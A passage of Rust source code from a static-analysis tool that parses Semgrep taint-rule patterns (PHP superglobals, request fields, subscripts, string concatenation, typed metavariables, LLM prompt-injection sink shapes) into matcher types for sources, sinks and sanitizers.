        // intermediate segments may be metavariables or identifiers.
        if let Some(field) = parse_member_call_penultimate(callee) {
            return Some(GenericMatcher::FieldName {
                field: field.to_string(),
                description: describe(field, role),
            });
        }

        // ── ReceiverCall shape: `receiver.$METHOD($X)` ──────────────────
        //
        // The symmetric counterpart of `MethodName`: a *concrete* receiver
        // identifier followed by a *metavariable* method. Compiled to
        // `ReceiverCall { receiver }`, matching any call whose callee root
        // equals `receiver` regardless of the method name. Covers the common
        // module-call sink shapes `os.$METHOD(...)`, `subprocess.$FUNC(...)`,
        // `Kernel.$X(...)`, `Shell.$X(...)`. Sink/sanitizer only.
        if let Some(receiver) = parse_receiver_dot_metavar(callee) {
            return match role {
                MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::ReceiverCall {
                    receiver: receiver.to_string(),
                    description: describe(receiver, role),
                }),
                MatcherRole::Source => None,
            };
        }

        // Callee must be a plain identifier or dotted identifier chain.
        if !is_dotted_identifier(callee) {
            return None;
        }
        let canonical = callee.to_string();
        return Some(GenericMatcher::Call {
            canonical: canonical.clone(),
            description: describe(&canonical, role),
        });
    }

    // ── PHP-style bare variable: `$_GET`, `$_POST`, `$_REQUEST`, etc. ──────
    //
    // PHP superglobals and user-defined variables start with `$` followed by
    // a valid identifier. When a Semgrep rule for PHP uses a pattern like
    // `$_GET` as a source, `is_dotted_identifier` fails (because `$` is not
    // an ASCII letter or underscore). We handle this explicitly BEFORE the
    // `is_dotted_identifier` guard: a bare `$name` pattern (no call parens,
    // no dots, no spaces) is compiled as `ParamName` for source roles. This
    // allows PHP taint rules to use `pattern: $_GET` as a source.
    if is_php_variable(pat) {
        return match role {
            MatcherRole::Source => Some(GenericMatcher::ParamName {
                names: vec![pat.to_string()],
                description: format!("untrusted `{}` input", pat),
            }),
            MatcherRole::Sink | MatcherRole::Sanitizer => None,
        };
    }

    // ── FieldName form: `$METAVAR.field` (any-receiver property read) ─────
    //
    // Semgrep taint rules overwhelmingly express web-request sources as a
    // property read on a metavariable receiver: `$REQ.body`, `$REQ.query`,
    // `$REQ.headers`, `$REQ.cookies`, `$REQ.params`, `$CTX.params`, etc.
    // The `Attribute` shape requires a *concrete* root identifier, so it
    // rejects a metavariable receiver. `FieldName` matches a property/
    // attribute READ of `field` regardless of receiver.
    //
    // Detection: exactly `$METAVAR.plain_identifier` — a single metavariable
    // segment, a single plain-identifier field, no call parens (handled
    // above), and no assignment `=` (MemberAssign handled above). Valid as a
    // source, sink, or sanitizer shape.
    if let Some(field) = parse_metavar_dot_method(pat) {
        return Some(GenericMatcher::FieldName {
            field: field.to_string(),
            description: describe(field, role),
        });
    }

    // ── Concrete-root, metavar-field source: `request.$ANYTHING` ─────────
    //
    // Django/Flask express "any attribute of the request object is untrusted"
    // as `request.$ANYTHING` (a *concrete* root identifier followed by a
    // metavariable field). We seed taint on the concrete root identifier as a
    // `ParamName` source: because the engine propagates taint from a tainted
    // root through attribute reads (`request.GET`, `request.POST`, …), seeding
    // the root covers every `request.<field>` access — exactly the intent of
    // the wildcard field. Only meaningful as a SOURCE.
    //
    // Discipline: the ROOT must be a concrete identifier (we refuse a
    // metavariable root like `$REQ.$ANYTHING`, which would taint every member
    // access on every receiver — a universal matcher with severe FP risk).
    if let MatcherRole::Source = role {
        if let Some(root) = parse_concrete_root_metavar_field(pat) {
            return Some(GenericMatcher::ParamName {
                names: vec![root.to_string()],
                description: format!("untrusted `{}` request object", root),
            });
        }
    }

    // ── No parens: identifier or attribute chain ────────────────────────
    if !is_dotted_identifier(pat) {
        return None;
    }

    if let Some(dot) = pat.rfind('.') {
        // `root.field` or `root.intermediate.field`. The engine only
        // supports one-level roots, so we take the leftmost segment as
        // the root and the outermost (last) segment as the field.
        let root = pat[..pat.find('.').expect("rfind guarantees at least one dot")].to_string();
        let field = pat[dot + 1..].to_string();
        if root.is_empty() || field.is_empty() {
            return None;
        }
        let desc = describe(pat, role);
        return Some(GenericMatcher::Attribute {
            root,
            field,
            description: desc,
        });
    }

    // Bare identifier → treat as a ParamName source / sink would not make
    // sense, so for non-source roles we refuse this shape.
    match role {
        MatcherRole::Source => Some(GenericMatcher::ParamName {
            names: vec![pat.to_string()],
            description: format!("untrusted `{}` parameter", pat),
        }),
        MatcherRole::Sink | MatcherRole::Sanitizer => None,
    }
}

/// If `pat` has the assignment shape `$METAVAR.field = $RHS` — a metavariable
/// receiver, a plain identifier property name, a single `=` operator, and any
/// RHS expression — return the property field name.  Returns `None` for all
/// other shapes (including `==`, `!=`, `<=`, `>=` operators).
///
/// Examples:
/// - `$EL.innerHTML = $X`  → `Some("innerHTML")`
/// - `$EL.outerHTML = $X`  → `Some("outerHTML")`
/// - `$FORM.action = $X`   → `Some("action")`
/// - `pickle.loads($X)`    → `None` (call form, no `=`)
/// - `$EL.innerHTML == $X` → `None` (equality comparison, not assignment)
/// - `$EL.a.b = $X`        → `None` (multi-segment LHS, ambiguous)
fn parse_member_assign_pattern(pat: &str) -> Option<&str> {
    // Find ` = ` with single `=` — must not be preceded or followed by
    // `=`, `!`, `<`, `>` to avoid confusing `==`, `!=`, `<=`, `>=`.
    let eq_pos = find_single_assignment(pat)?;
    let lhs = pat[..eq_pos].trim();
    // No call parens allowed in the LHS.
    if lhs.contains('(') || lhs.contains(')') {
        return None;
    }
    // LHS must have exactly the shape `$METAVAR.field`.
    parse_metavar_dot_method(lhs)
}

/// Find the byte offset of a standalone `=` in `s`, i.e. `=` that is not
/// part of `==`, `!=`, `<=`, or `>=`.  Returns the position of the `=`
/// character, or `None` if no such operator is present.
fn find_single_assignment(s: &str) -> Option<usize> {
    let bytes = s.as_bytes();
    for (i, &b) in bytes.iter().enumerate() {
        if b != b'=' {
            continue;
        }
        // Reject `==`.
        if bytes.get(i + 1) == Some(&b'=') {
            continue;
        }
        // Reject `!=`, `<=`, `>=`.
        if i > 0 && matches!(bytes[i - 1], b'!' | b'<' | b'>') {
            continue;
        }
        return Some(i);
    }
    None
}

/// If `pat` is a subscript / index access `base[...]`, return the matched
/// base as `Some(Some(name))` (concrete base whose final segment is `name`)
/// or `Some(None)` (metavariable base — match any subscript). Returns `None`
/// when `pat` is not a subscript shape we can express.
///
/// The base is the substring before the FIRST `[`; the pattern must end with
/// `]`. The base must be one of:
/// - a plain identifier (`params` → `Some(Some("params"))`)
/// - a dotted attribute chain (`request.POST` → `Some(Some("POST"))`,
///   `flask.request.args` → `Some(Some("args"))` — final segment)
/// - a bare metavariable (`$VALS` → `Some(None)`)
/// - a chain whose final segment is a metavariable (`$REQ.$X` → `Some(None)`)
///
/// Anything else (empty base, base containing a call, nested brackets that
/// don't close at the end, operators) returns `None`.
fn parse_subscript_base(pat: &str) -> Option<Option<String>> {
    if !pat.ends_with(']') {
        return None;
    }
    let open = pat.find('[')?;
    let base = pat[..open].trim();
    if base.is_empty() {
        return None;
    }
    // The base must not be a call or contain other brackets / operators.
    if base.contains('(') || base.contains(')') || base.contains('[') || base.contains(' ') {
        return None;
    }
    // Bare metavariable base → match any subscript.
    if is_metavariable(base) {
        return Some(None);
    }
    // Plain identifier base.
    if is_identifier(base) {
        return Some(Some(base.to_string()));
    }
    // Dotted chain: take the final segment. If it is a metavariable, the
    // indexed property is unknown → match any subscript. Otherwise use the
    // final identifier segment as the base name.
    if let Some(dot) = base.rfind('.') {
        let last = &base[dot + 1..];
        if is_metavariable(last) {
            return Some(None);
        }
        if is_identifier(last) {
            // Require every preceding segment to be an identifier or a
            // metavariable so we only accept genuine attribute chains.
            let head_ok = base[..dot]
                .split('.')
                .all(|seg| is_identifier(seg) || is_metavariable(seg));
            if head_ok {
                return Some(Some(last.to_string()));
            }
        }
    }
    None
}

/// True when `pat` is an object/dict literal sink shape: a brace-delimited
/// literal `{ ... }` that contains at least one `key: $METAVAR` value position.
///
/// Recognises the LLM system-prompt-injection sinks
/// `{role: "system", content: $SINK}` (JS) and
/// `{"role": "system", "content": $SINK}` (Python). The compile-time check
/// only recognises the *shape* (a literal-construction sink whose value slot is
/// a metavariable); the engine enforces the "literal is actually constructed
/// AND a tainted value reaches a value slot" guard at match time.
///
/// Discipline: must start with `{` and end with `}` (a real literal, not a set
/// comprehension or a block) and must contain a `:` immediately followed
/// (ignoring whitespace) by a `$` metavariable somewhere — i.e. a tainted value
/// position. This refuses bare `{$X}` set/dict-key shapes and `{...}` ellipsis
/// blobs that carry no metavariable value.
fn is_object_literal_value_pattern(pat: &str) -> bool {
    let p = pat.trim();
    if !(p.starts_with('{') && p.ends_with('}')) {
        return false;
    }
    // Need at least one `:` whose value side begins with a `$` metavariable.
    let bytes = p.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b':' {
            // Skip whitespace after the colon.
            let mut j = i + 1;
            while j < bytes.len() && (bytes[j] as char).is_whitespace() {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'$' {
                // The metavariable must be a real `$NAME`, not `${` (a JS
                // template-substitution would not appear at a value head here,
                // but guard anyway) and not the end of the literal.
                let mut k = j + 1;
                if k < bytes.len() && (bytes[k].is_ascii_alphabetic() || bytes[k] == b'_') {
                    while k < bytes.len() && (bytes[k].is_ascii_alphanumeric() || bytes[k] == b'_')
                    {
                        k += 1;
                    }
                    return true;
                }
            }
        }
        i += 1;
    }
    false
}

/// True (as `Some(())`) when `pat` is exactly `return $METAVAR` — the keyword
/// `return`, whitespace, then a single bare Semgrep metavariable and nothing
/// else. This is the LLM "unsanitized return" / directly-returned sink shape.
/// Refuses `return "...".format(...)`, `return $X + $Y`, `return f"..."`, etc.
/// (those are handled — or not — by other shapes), and refuses a bare `return`.
fn parse_return_metavar(pat: &str) -> Option<()> {
    let rest = pat.strip_prefix("return")?;
    // Require whitespace right after `return` (so `returnx` is not matched).
    if !rest.starts_with(char::is_whitespace) {
        return None;
    }
    let v = rest.trim();
    // Must be a single bare metavariable `$NAME` (uppercase Semgrep convention,
    // but accept any valid identifier after `$`) with no trailing tokens.
    let name = v.strip_prefix('$')?;
    if name.is_empty() {
        return None;
    }
    let mut chars = name.chars();
    let first = chars.next()?;
    if !(first.is_ascii_alphabetic() || first == '_') {
        return None;
    }
    if name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        Some(())
    } else {
        None
    }
}

/// True when `pat` is a string-building sink shape the engine should match as
/// a `BinopFormat`: a binary `+`/`%` concatenation or an f-string
/// interpolation. The compile-time check only recognises the *shape*; the
/// engine enforces the literal-operand + tainted-operand guard at match time.
///
/// Recognised:
/// - f-string interpolation: `f"...{$X}..."` / `f'...{$X}...'`
/// - binary `+`/`%`: `"$SQL" + $EXPR`, `$A + $B`, `$M % $M`, `... + $X`
///   — split on top-level ` + ` / ` % ` operators (outside quotes/brackets);
///   every operand must be a quoted string literal, a metavariable, the
///   `...` ellipsis, or a plain/dotted identifier chain, and at least two
///   operands must be present.
///
/// Rejected (returns false): plain calls, attribute chains, subscripts,
/// assignments, and any binop whose operands include unrecognised tokens.
/// True when `pat` is a LOOSE-equality comparison of two metavariables —
/// `$VAR1 == $VAR2` or `$VAR1 != $VAR2` — and NOT the strict `===`/`!==`.
///
/// Faithfulness (the whole point of `md5-loose-equality`): the strict operators
/// `===`/`!==` are the SAFE form the rule recommends, so they must never match.
/// The pattern is accepted only when, after trimming, the whole expression is
/// exactly `<metavar> <op> <metavar>` with `op` ∈ {`==`, `!=`} and the operator
/// is not part of a longer `===`/`!==` token.
fn is_loose_equality_pattern(pat: &str) -> bool {
    let p = pat.trim();
    for op in ["==", "!="] {
        let Some(idx) = p.find(op) else {
            continue;
        };
        // Reject the strict form: `==`/`!=` immediately followed by another `=`
        // is `===`/`!==` (the safe comparison the rule does NOT flag).
        if p[idx + op.len()..].starts_with('=') {
            continue;
        }
        // Reject `<=` / `>=` masquerading as `==` scan noise: `==` cannot be
        // preceded by `<`/`>`/`!` (a distinct operator), and `!=` is searched
        // separately, so a boundary check on the byte before `idx` suffices.
        if idx > 0 {
            let prev = p.as_bytes()[idx - 1];
            if matches!(prev, b'<' | b'>' | b'!' | b'=') {
                continue;
            }
        }
        let lhs = p[..idx].trim();
        let rhs = p[idx + op.len()..].trim();
        if is_metavariable(lhs) && is_metavariable(rhs) {
            return true;
        }
    }
    false
}

fn is_binop_format_pattern(pat: &str) -> bool {
    // f-string interpolation: `f"...{$...}..."`.
    if (pat.starts_with("f\"") || pat.starts_with("f'")) && pat.contains("{$") {
        return true;
    }

    // Binary `+` / `%` concatenation. Split on top-level operators, skipping
    // anything inside quotes or brackets so `"a + b"` and `f($x + $y)` don't
    // confuse the scan.
    let operands = split_top_level_binop(pat);
    let Some(operands) = operands else {
        return false;
    };
    if operands.len() < 2 {
        return false;
    }
    operands.iter().all(|o| is_binop_operand(o))
}

/// Split `pat` on top-level ` + ` / ` % ` operators, returning the operand
/// substrings, or `None` if there is no such top-level operator (so the caller
/// can reject the shape). "Top-level" means not inside `"`/`'` quotes or
/// `(`/`[`/`{` brackets.
fn split_top_level_binop(pat: &str) -> Option<Vec<&str>> {
    let bytes = pat.as_bytes();
    let mut operands = Vec::new();
    let mut start = 0usize;
    let mut depth: i32 = 0;
    let mut quote: Option<u8> = None;
    let mut found_op = false;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match b {
            b'"' | b'\'' => quote = Some(b),
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth -= 1,
            b'+' | b'%' if depth == 0 => {
                // Require surrounding spaces to be a binary operator (Semgrep
                // formatting always uses `a + b`, never `a+b` in these rules).
                let space_before = i > 0 && bytes[i - 1] == b' ';
                let space_after = i + 1 < bytes.len() && bytes[i + 1] == b' ';
                if space_before && space_after {
                    operands.push(pat[start..i].trim());
                    start = i + 1;
                    found_op = true;
                }
            }
            _ => {}
        }
        i += 1;
    }
    if !found_op {
        return None;
    }
    operands.push(pat[start..].trim());
    Some(operands)
}

/// True when `o` is an acceptable operand of a `BinopFormat` concatenation: a
/// quoted string literal, a Semgrep metavariable (`$X`), the `...` ellipsis, a
/// plain/dotted identifier chain, or such a chain wrapped in a single call /
/// subscript. Anything containing further unbalanced operators is rejected.
fn is_binop_operand(o: &str) -> bool {
    let o = o.trim();
    if o.is_empty() {
        return false;
    }
    if o == "..." {
        return true;
    }
    // Quoted string literal (possibly an f-string).
    if (o.starts_with('"') && o.ends_with('"') && o.len() >= 2)
        || (o.starts_with('\'') && o.ends_with('\'') && o.len() >= 2)
        || (o.starts_with("f\"") && o.ends_with('"'))
        || (o.starts_with("f'") && o.ends_with('\''))
    {
        return true;
    }
    if is_metavariable(o) {
        return true;
    }
    if is_dotted_identifier(o) {
        return true;
    }
    false
}

/// True when `pat` is a Python string-CONSTRUCTION source shape: an f-string,
/// a `+`/`%` concatenation with a string-ish operand, or a `.format(...)` call
/// whose receiver is a metavariable or string literal. This is the SOURCE-side
/// recogniser for rules (`avoid-sqlalchemy-text`, `twiml-injection`) that treat
/// a dynamically assembled string as their taint origin. Requiring a concrete
/// literal / f-string keeps it stricter than Semgrep's `metavariable-type:
/// string` narrowing (never seeds numeric arithmetic), so it stays FP-safe.
fn is_python_string_construction_source(pat: &str) -> bool {
    let p = pat.trim();
    // f-string literal: `f"..."` / `f'...'` (with or without interpolation).
    if p.starts_with("f\"") || p.starts_with("f'") {
        return true;
    }
    // Binary `+` / `%` concatenation with string-ish operands (reuses the
    // sink-side recogniser, which already requires ≥2 concatenation operands).
    if is_binop_format_pattern(p) {
        return true;
    }
    // `$X.format(...)` / `"...".format(...)`: a `.format` call whose receiver is
    // a metavariable or a string literal.
    if let Some(recv) = parse_format_call_receiver(p) {
        if is_metavariable(recv) || is_quoted_string_literal(recv) {
            return true;
        }
    }
    false
}

/// If `pat` is a `<recv>.format(...)` call expression, return the receiver text
/// (`<recv>`). Returns `None` for any other shape. Used by
/// [`is_python_string_construction_source`].
fn parse_format_call_receiver(pat: &str) -> Option<&str> {
    let p = pat.trim();
    if !p.ends_with(')') {
        return None;
    }
    let open = p.find('(')?;
    let head = p[..open].trim_end();
    let dot = head.rfind('.')?;
    if head[dot + 1..].trim() != "format" {
        return None;
    }
    Some(head[..dot].trim())
}

/// True when `s` is a (possibly f-prefixed) single-quoted or double-quoted
/// string literal.
fn is_quoted_string_literal(s: &str) -> bool {
    let s = s.trim();
    let body = s.strip_prefix('f').unwrap_or(s);
    (body.starts_with('"') && body.ends_with('"') && body.len() >= 2)
        || (body.starts_with('\'') && body.ends_with('\'') && body.len() >= 2)
}

/// If `callee` has the shape `$METAVAR.plain_method` — exactly one
/// `$`-prefixed metavariable segment followed by a plain identifier — return
/// the method name. Returns `None` for all other shapes.
///
/// Examples:
/// - `$CONN.executeQuery` → `Some("executeQuery")`
/// - `$OBJ.innerHTML` → `Some("innerHTML")`
/// - `pickle.loads` → `None` (dotted plain identifier, handled as `Call`)
/// - `$X` → `None` (bare metavariable, no method)
/// - `$A.b.c` → `None` (more than one segment after the metavar)
fn parse_metavar_dot_method(callee: &str) -> Option<&str> {
    let dot = callee.find('.')?;
    let receiver = &callee[..dot];
    let rest = &callee[dot + 1..];
    // Receiver must be a metavariable: `$` followed by UPPER or `_`
    if !is_metavariable(receiver) {
        return None;
    }
    // The rest must be a single plain identifier (no more dots).
    if rest.contains('.') {
        return None;
    }
    if !is_identifier(rest) {
        return None;
    }
    Some(rest)
}

/// If `pat` has the shape `root.$METAVAR` — a *concrete* plain-identifier root
/// followed by a single metavariable field — return the root identifier.
/// Used to compile `request.$ANYTHING` (Django/Flask "any request attribute")
/// to a `ParamName` source on the concrete root. Returns `None` for a
/// metavariable root (`$REQ.$ANYTHING` — too broad), a concrete field
/// (`request.GET` — that is a plain `Attribute`), or any chain that is not
/// exactly two dot-separated segments.
///
/// Examples:
/// - `request.$ANYTHING` → `Some("request")`
/// - `req.$X`            → `Some("req")`
/// - `$REQ.$ANYTHING`    → `None` (metavar root)
/// - `request.GET`       → `None` (concrete field — handled by `Attribute`)
/// - `a.b.$X`            → `None` (more than two segments)
fn parse_concrete_root_metavar_field(pat: &str) -> Option<&str> {
    let dot = pat.find('.')?;
    let root = &pat[..dot];
    let field = &pat[dot + 1..];
    // Exactly two segments: the field must not contain a further dot.
    if field.contains('.') {
        return None;
    }
    if !is_identifier(root) {
        return None;
    }
    if !is_metavariable(field) {
        return None;
    }
    Some(root)
}

/// If `callee` is a CALL-ON-MEMBER receiver chain — a dotted path of three or
/// more segments where (a) at least one segment is a Semgrep metavariable
/// (otherwise the fully-concrete chain is already handled by the `Call`
/// branch), (b) the *final* segment (the method name) is a concrete
/// identifier, and (c) the *penultimate* segment (the field read just before
/// the method) is a concrete identifier — return the penultimate field name.
///
/// Every other segment may be an identifier or a metavariable. Returns `None`
/// for two-segment callees (handled by [`parse_metavar_dot_method`] /
/// [`parse_receiver_dot_metavar`]), for chains whose penultimate or final
/// segment is a metavariable (we refuse to compile an any-field/any-method
/// matcher — too broad), and for fully-concrete chains.
///
/// Examples:
/// - `$CLIENT.chat.completions.create` → `Some("completions")`
/// - `$CLIENT.messages.create`         → `Some("messages")`
/// - `$REQ.POST.get`                   → `Some("POST")`
/// - `request.$PROPERTY.get`           → `None` (penultimate is a metavar)
/// - `$CONN.executeQuery`              → `None` (two segments)
/// - `flask.request.form.get`          → `None` (fully concrete → `Call`)
fn parse_member_call_penultimate(callee: &str) -> Option<&str> {
    let segments: Vec<&str> = callee.split('.').collect();
    if segments.len() < 3 {
        return None;
    }
    let method = segments[segments.len() - 1];
    let field = segments[segments.len() - 2];
    // Final method and penultimate field must both be concrete identifiers.
    if !is_identifier(method) || !is_identifier(field) {
        return None;
    }
    // Every other (prefix) segment must be an identifier or a metavariable.
    let mut has_metavar = false;
    for seg in &segments[..segments.len() - 2] {
        if is_metavariable(seg) {
            has_metavar = true;
        } else if !is_identifier(seg) {
            return None;
        }
    }
    // A fully-concrete chain is already compiled by the `Call` branch; only
    // engage when a metavariable is present in the receiver prefix.
    if !has_metavar {
        return None;
    }
    Some(field)
}

/// If `callee` has the shape `receiver.$METAVAR` — a concrete plain
/// identifier receiver followed by a single metavariable method segment —
/// return the receiver name. The symmetric counterpart of
/// [`parse_metavar_dot_method`]. Returns `None` for all other shapes.
///
/// Examples:
/// - `os.$METHOD` → `Some("os")`
/// - `subprocess.$FUNC` → `Some("subprocess")`
/// - `Kernel.$X` → `Some("Kernel")`
/// - `$CONN.executeQuery` → `None` (metavar receiver — handled as MethodName)
/// - `os.system` → `None` (concrete method — handled as Call)
/// - `a.b.$X` → `None` (multi-segment receiver, ambiguous)
fn parse_receiver_dot_metavar(callee: &str) -> Option<&str> {
    let dot = callee.find('.')?;
    let receiver = &callee[..dot];
    let rest = &callee[dot + 1..];
    // Receiver must be a single plain identifier (no further dots).
    if !is_identifier(receiver) {
        return None;
    }
    // The method segment must be a single metavariable (no more dots).
    if rest.contains('.') {
        return None;
    }
    if !is_metavariable(rest) {
        return None;
    }
    Some(receiver)
}

/// If `pat` is a paren-less "command" call — a plain-identifier callee
/// followed by whitespace and a WHOLE-ARGS argument list — return the callee
/// identifier. Used to compile Ruby / PHP paren-less calls (`echo $...VARS`,
/// `send_file ...`) to a [`GenericMatcher::Call`].
///
/// A "whole-args" argument list is one whose only content is the tainted flow
/// itself: the `...` ellipsis, a single Semgrep metavariable (`$X`), or a PHP
/// variadic metavariable (`$...VARS`). This mirrors the parenthesised call
/// form, which strips arguments and fires on any tainted argument.
///
/// Returns `None` for:
/// - a callee that is not a bare identifier (`$X ...`, `a.b ...`),
/// - an empty argument list (a bare identifier — handled elsewhere),
/// - a keyworded / positional-specific argument list (`..., file: $X`,
///   `$X, $Y`) — compiling those to a bare `Call` would over-match argument
///   positions the rule never named.
///
/// Examples:
/// - `echo $...VARS`      → `Some("echo")`
/// - `send_file ...`      → `Some("send_file")`
/// - `redirect_to $URL`   → `Some("redirect_to")`
/// - `render ..., file: $X` → `None` (keyworded arg list — would over-match)
/// - `$X + $Y`            → `None` (callee is not an identifier)
fn parse_command_call(pat: &str) -> Option<&str> {
    let sp = pat.find([' ', '\t'])?;
    let callee = &pat[..sp];
    if !is_identifier(callee) {
        return None;
    }
    let args = pat[sp..].trim();
    if args.is_empty() || !is_whole_args_list(args) {
        return None;
    }
    Some(callee)
}

/// True when `args` is a "whole-args" command-call argument list: the `...`
/// ellipsis, a single Semgrep metavariable (`$X`), or a PHP variadic
/// metavariable (`$...VARS`). See [`parse_command_call`].
fn is_whole_args_list(args: &str) -> bool {
    if args == "..." {
        return true;
    }
    // PHP variadic metavariable `$...NAME`.
    if let Some(rest) = args.strip_prefix("$...") {
        return !rest.is_empty() && rest.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
    }
    // A single metavariable `$X` (no trailing tokens — `is_metavariable`
    // already rejects embedded whitespace, commas, colons, and operators).
    is_metavariable(args)
}

/// True when `s` is a Semgrep metavariable: `$` followed by one or more
/// ASCII uppercase letters or underscores (e.g. `$X`, `$CONN`, `$_`).
/// Parse a Semgrep "typed metavariable" pattern `(Type $MV)` optionally
/// followed by a trailing member/call chain. Returns
/// `(type_text, metavar_text, remainder)`:
///
/// - `(HttpServletRequest $REQ)`             -> ("HttpServletRequest", "$REQ", "")
/// - `(HttpServletRequest $REQ).$FUNC(...)`  -> ("HttpServletRequest", "$REQ", ".$FUNC(...)")
/// - `(java.sql.Statement $S).execute(...)`  -> ("java.sql.Statement", "$S", ".execute(...)")
/// - `(javax.servlet.http.Cookie[] $C)`      -> ("javax.servlet.http.Cookie[]", "$C", "")
///
/// Only matches when the pattern STARTS with `(<type> <$METAVAR>)` where
/// `<type>` is a (possibly dotted, array-, or generic-suffixed) type name and
/// `<$METAVAR>` is a single Semgrep metavariable. The typed group never
/// contains inner parentheses, so the first `)` closes it.
fn parse_typed_metavar(pat: &str) -> Option<(&str, &str, &str)> {
    let pat = pat.trim();
    let rest = pat.strip_prefix('(')?;
    let close = rest.find(')')?;
    let inner = rest[..close].trim();
    let (ty, mv) = inner.rsplit_once(char::is_whitespace)?;
    let ty = ty.trim();
    let mv = mv.trim();
    if !is_metavariable(mv) || !is_type_name(ty) {
        return None;
    }
    let remainder = &rest[close + 1..];
    Some((ty, mv, remainder))
}

/// Parse Go's COLON-syntax typed metavariable `($MV : Type)` optionally followed
/// by a trailing member/method read. Returns `(type_text, metavar_text,
/// remainder)`:
///
/// - `($REQUEST : *http.Request).$ANYTHING` -> ("*http.Request", "$REQUEST", ".$ANYTHING")
/// - `($REQUEST : http.Request).$ANYTHING`  -> ("http.Request",  "$REQUEST", ".$ANYTHING")
/// - `($REQUEST : *http.Request)`           -> ("*http.Request", "$REQUEST", "")
/// - `($X: bool)`                           -> ("bool",          "$X",       "")
///
/// This is DISTINCT from Java's parenthesised `(Type $MV)` form: Go writes the
/// metavariable FIRST and the type SECOND, separated by a `:` (with or without
/// surrounding whitespace). The typed group never contains inner parentheses, so
/// the first `)` closes it. Only matches when the metavariable is a single
/// Semgrep metavariable and the type is a Go type reference (`is_go_type_name`).
fn parse_go_typed_metavar(pat: &str) -> Option<(&str, &str, &str)> {
    let pat = pat.trim();
    let rest = pat.strip_prefix('(')?;
    let close = rest.find(')')?;
    let inner = rest[..close].trim();
    let (mv, ty) = inner.split_once(':')?;
    let mv = mv.trim();
    let ty = ty.trim();
    if !is_metavariable(mv) || !is_go_type_name(ty) {
        return None;
    }
    let remainder = &rest[close + 1..];
    Some((ty, mv, remainder))
}

/// True when `s` is a Go type reference usable as a colon-typed-metavariable
/// annotation: an optionally pointer-prefixed (`*`), possibly package-qualified
/// (`http.Request`) identifier chain. Slice / array prefixes (`[]`) are also
/// tolerated so `[]byte`-style annotations don't falsely parse a `:` elsewhere.
fn is_go_type_name(s: &str) -> bool {
    let base = normalize_go_type(s);
    is_dotted_identifier(&base)
}

/// Normalize a Go type reference to a comparable form by stripping a leading
/// pointer (`*`), address-of (`&`), and slice/array (`[]`) markers, plus
/// surrounding whitespace — keeping the package-qualified name intact:
/// `*http.Request` and `http.Request` both normalize to `http.Request`;
/// `[]byte` to `byte`. Used to compare a source's declared-type annotation
/// against a variable's syntactic declared type on BOTH sides consistently.
/// Shared with the Go taint engine so both sides normalize identically.
pub(crate) fn normalize_go_type(s: &str) -> String {
    let mut base = s.trim();
    loop {
        let trimmed = base
            .trim_start_matches('*')
            .trim_start_matches('&')
            .trim_start();
        let trimmed = trimmed.strip_prefix("[]").unwrap_or(trimmed).trim_start();
        if trimmed == base {
            break;
        }
        base = trimmed;
    }
    base.trim().to_string()
}

/// True when `s` looks like a Java type reference usable as a typed-metavariable
/// annotation: a (possibly dotted) identifier chain, optionally suffixed with
/// array brackets (`[]`) and/or a generic argument list (`<...>`).
fn is_type_name(s: &str) -> bool {
    let mut base = s.trim();
    // Drop a trailing generic argument list `<...>`.
    if base.ends_with('>') {
        if let Some(lt) = base.find('<') {
            base = base[..lt].trim_end();
        }
    }
    // Drop any trailing array brackets `[]` (possibly repeated).
    while let Some(stripped) = base.strip_suffix("[]") {
        base = stripped.trim_end();
    }
    is_dotted_identifier(base)
}

/// The final `.`-segment of a (possibly fully-qualified) type reference, with
/// array/generic suffixes stripped: `javax.servlet.http.HttpServletRequest`
/// and `HttpServletRequest` both yield `HttpServletRequest`; `Cookie[]` yields
/// `Cookie`. Used to match a Semgrep typed-metavariable annotation against a
/// declared type by simple name.
fn type_final_segment(type_text: &str) -> &str {
    let mut base = type_text.trim();
    if base.ends_with('>') {
        if let Some(lt) = base.find('<') {
            base = base[..lt].trim_end();
        }
    }
    while let Some(stripped) = base.strip_suffix("[]") {
        base = stripped.trim_end();
    }
    base.rsplit('.').next().unwrap_or(base).trim()
}

fn is_metavariable(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some('$') => {}
        _ => return false,
    }
    let rest: String = chars.collect();
    // Semgrep metavariables are `$` + `[A-Z_][A-Z0-9_]*` — allow trailing digits
    // (e.g. `$ARG1`) while still rejecting lowercase (`$obj`).
    !rest.is_empty()
        && rest
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
}

fn describe(canonical: &str, role: MatcherRole) -> String {
    match role {
        MatcherRole::Source => format!("semgrep source `{}`", canonical),
        MatcherRole::Sink => format!("semgrep sink `{}`", canonical),
        MatcherRole::Sanitizer => format!("semgrep sanitizer `{}`", canonical),
    }
}

/// True when `s` is a `.`-separated chain of identifier segments, each of
/// which is an ASCII identifier (`[A-Za-z_][A-Za-z0-9_]*`). Used to reject
/// pattern strings that contain metavariables, operators, or whitespace
/// outside of a call form.
fn is_dotted_identifier(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    s.split('.').all(is_identifier)
}

fn is_identifier(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// True when `s` is a pure Ruby constant scope-resolution path: two or more
/// `Const` segments joined by `::`, each starting with an uppercase letter and
/// containing only identifier characters (`Digest::MD5`, `Net::HTTP`,
/// `A::B::C`). Rejects anything carrying a method call, subscript, dot, space,
/// or a lowercase-headed segment — those are not bare constant references.
fn is_ruby_constant_path(s: &str) -> bool {
    let p = s.trim();
    if !p.contains("::") {
        return false;
    }
    if p.contains('(') || p.contains(')') || p.contains('[') || p.contains(' ') || p.contains('.') {
        return false;
    }
    let segments: Vec<&str> = p.split("::").collect();
    if segments.len() < 2 {
        return false;
    }
    segments.iter().all(|seg| {
        seg.chars().next().is_some_and(|c| c.is_ascii_uppercase())
            && seg.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

